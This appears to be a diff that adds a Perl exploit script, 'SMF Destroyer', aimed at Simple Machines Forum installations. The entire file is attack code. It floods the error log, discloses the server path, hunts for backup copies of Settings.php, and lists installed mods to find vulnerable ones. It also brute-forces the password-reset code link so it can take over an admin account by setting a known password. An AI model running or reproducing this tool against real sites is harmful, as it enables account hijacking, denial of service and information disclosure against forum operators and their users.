@@ -1,0 +1,198 @@
+#!/usr/bin/perl
+
+    use LWP::UserAgent;
+    use Getopt::Std;
+    use LWP::Simple;
+    use HTTP::Request;
+
+#Author: Xianur0
+#Uxmal666[at]gmail.com
+# Cracks links Password Recovery
+# Find Temporary Files executed by mods
+# DB function Flood by Error Log
+# File Path Disclosure
+# List installed Mods (Useful To Find Mods Vulnerable)
+# etc. ..
+
+print "\n\n\x09\x09\x09\x09\x09SMF Destroyer 0.1 By Xianur0 [Priv8]\n\n";
+my $url = $ARGV[1] || die ("Use: smf.pl [option] [Full URL]
+[Proxy:Puerto]\nOptions:\n-f Flood \n-p Search Directory Setup \n-l
+Installed Mods List \n-b Find Temporary\n-c  Cracks links Password
+Recovery (Recommended Use Proxy)");
+version();
+my $proxy = $ARGV[2] || "";
+if($ARGV[0] ne "-c" && $proxy ne "") {
+$ua->proxy(["http"], "http://".$proxy);
+}
+
+    getopts('fplbc', \%opt);
+    crackeador() if $opt{c};
+    flood() if $opt{f};
+    path() if $opt{p};
+    list() if $opt{l};
+    temp() if $opt{b};
+
+sub headers {
+$req->header('Accept' => 'text/html');
+$req->header('Accept-Language' => 'es-es,es;q=0.8,en-us;q=0.5,en;q=0.3');
+}
+
+sub version {
+$ua = LWP::UserAgent->new;
+$ua->agent('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.12)
+Gecko/20080201 Firefox/2.0.0.12');
+$req = HTTP::Request->new(GET => $url);
+&headers;
+$res = $ua->request($req);
+if ($res->is_success) {
+ my $html = $res->content;
+if ($html =~ /title="Simple Machines Forum" target="_blank">Powered by
+SMF (.*?)<\/a>/){
+$version = $1;
+print "\n[X] SMF Version: $version\n";
+if($version < "1.1.7") {
+print "\n[X] Outdated Version $version!!!!!!!!!!!\n\n[X]
+http://milw0rm.com/search.php?dong=smf".$version."\n\n";
+}
+}}}
+
+sub path {
+$req = HTTP::Request->new(GET => $url.'/SSI.php?ssi_layers');
+&headers;
+$res = $ua->request($req);
+if ($res->is_success) {
+ my $html = $res->content;
+if ($html =~ /Undefined variable: ssi_layers in <b>(.*?)SSI.php/){
+print "[X] Directory: $1\n";
+} else { print "[!] Getting error Directory!\n";}
+}
+}
+
+sub flood {
+print "[X] Starting Flood! (Press Ctrl + C To Finish)\n";
+$texto = "Flood!!!!!" x 15;
+$req = HTTP::Request->new(GET =>
+$url.'/index.php?action=help;page['.$texto.']=loginout');
+&headers;
+for($i = 1; $i<10000; $i++) {
+$res = $ua->request($req);
+if ($res->is_success) {
+print "[-] Sent: ".$i."\n";
+} else {
+print "[!] HTTP Error Query: " . $res->status_line . "\n";
+}
+}
+}
+
+
+sub temp {
+@temps=('index.php~','Settings.php~','Settings_bak.php~');
+foreach $temp (@temps) {
+$req = HTTP::Request->new(GET => $url."/".$temp);
+&headers;
+$res = $ua->request($req);
+if ($res->is_success) {
+print "[X] Temporary File Found: ".$url."/".$temp."\n";
+} else {print "[!] Not Found: ".$url."/".$temp."\n";}
+}
+}
+
+sub list {
+$req = HTTP::Request->new(GET => $url."/Packages/installed.list");
+&headers;
+$res = $ua->request($req);
+if ($res->is_success) {
+ my $html = $res->content;
+my @htmls = split("\n", $html);
+foreach $mod (@htmls) {
+my @mod = split('\|\^\|', $mod);
+print "[X]Package:\nDescription: $mod[0]\nFile:
+$url/Packages/$mod[1]\nName: $mod[2]\nVersion: $mod[3]\n\n";
+
+}
+}
+}
+
+sub crackeador() {
+$url = $ARGV[0];
+$nick = $ARGV[1];
+$id = $ARGV[2] || die("Use: smf.pl -c [URL SMF] [Nick Admin] [ID
+Admin] [Proxy:Puerto]\nExample: smf.pl -p
+http://www.simplemachines.org/community/ dschwab9 179
+www.carlosslim.com:3128\n");
+my $reminder = $url."?action=reminder";
+my $smf = $reminder.";sa=setpassword;u=".$id.";code=";
+my $proxy = $ARGV[3];
+if($proxy ne "") {
+$ua->proxy(["http"], "http://".$proxy);
+}
+
+sub mail() {
+my $content = HTTP::Request->new(GET => $reminder);
+$contenedor = $ua->request($content)->as_string;
+if ($contenedor =~ /Set-Cookie: (.*?)
+/){
+        print "\n[+] SESSION Detected: $1\n";
+$session = $1;
+} else { die "[!] SESSION could not be found!\n";}
+if ($contenedor =~ /<input type="hidden" name="sc" value="(.*?)"/){
+        print "\n[+] sc Detected: $1\n";
+    $sc = $1;
+} else { die "[!] SC could not be found!\n";}
+my $req = HTTP::Request->new(POST => $reminder.';sa=mail');
+  $req->content_type('application/x-www-form-urlencoded');
+  $req->content('user='.$nick.'&sc='.$sc.'&=enviar');
+  $req->header('Cookie' => $session);
+my $res = $ua->request($req)->as_string;
+if(!$res) {exit;}
+print "[x]Sent!\n";
+
+}
+
+sub generador() {
+my $password = "";
+my @chars = split(" ",
+    "0 1 2 3 4 5 6 7 8 9 a b c d e
+    f g h i j k l m n o p q r s t
+    u v w x y z");
+for (my $i=0; $i < 10 ;$i++) {
+    $_rand = int(rand 35);
+    $password .= $chars[$_rand];
+}
+return $password;
+}
+
+sub brute() {
+while($bucle ne "finito") {
+$code = generador();
+    my $fuente = $reminder.";sa=setpassword;u=".$id.";code=".$code;
+    my $content = HTTP::Request->new(GET => $reminder);
+    my $content = $ua->request($content)->as_string;
+if ($content =~ /<input type="hidden" name="sc" value="(.*?)"/){
+    $sc = $1;
+} else { die "[!] SC could not be found!\n";}
+if ($content =~ /Set-Cookie: (.*?)
+/){
+        print "\n[+] New SESSION Detected: $1\n";
+$session = $1;
+} else { die "[!] SESSION could not be found!\n";}
+print "[+] Testing Code: ".$code."\n";
+my $req = HTTP::Request->new(POST => $reminder.';sa=mail');
+  $req->content_type('application/x-www-form-urlencoded');
+  $req->content('passwrd1=xianur0washere&passwrd2=xianur0washere&code='.$code.'&u='.$id.'&sc='.$sc);
+  $req->header('Cookie' => $session);
+  $res = $ua->request($req);
+  if ($res->is_success) {
+     if($res->content =~ '<input type="text" name="user" size="20" value="') {
+print "[-] Password Changed!\n[x] New password: xianur0washere\nUsername: $1\n";
+exit;
+}
+} else { die "[!] HTTP response incorrect!\n";}}}
+
+print "\n[-] Sending Mail...\n\n";
+mail();
+print "\n[-] Attacking code link recovery...\n";
+brute();
+}
+
+# milw0rm.com [2009-01-12]
